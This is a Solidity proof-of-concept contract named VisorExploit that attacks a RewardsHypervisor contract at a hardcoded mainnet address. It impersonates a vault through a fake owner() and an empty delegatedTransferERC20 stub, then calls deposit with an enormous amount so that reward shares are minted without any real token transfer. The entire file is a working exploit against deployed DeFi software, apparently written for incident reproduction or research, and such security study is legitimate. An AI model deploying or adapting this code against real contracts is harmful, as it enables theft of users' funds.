//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.13;

import "forge-std/console2.sol";

interface IRewardsHypervisor{
    function deposit(uint256,address,address) external returns(uint256);
    function withdraw(uint256,address,address) external returns(uint256);
}

contract VisorExploit {
    IRewardsHypervisor public rewards = IRewardsHypervisor(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef);
    address public eoa;
    constructor(){
        eoa = msg.sender;


    }
    function owner() public view returns(address){
        return (address(this));

    }

    function attack() public{
        rewards.deposit(100000000000000000000000000, address(this), eoa);
    }
    function delegatedTransferERC20(address token, address to, uint256 amount) external{}


}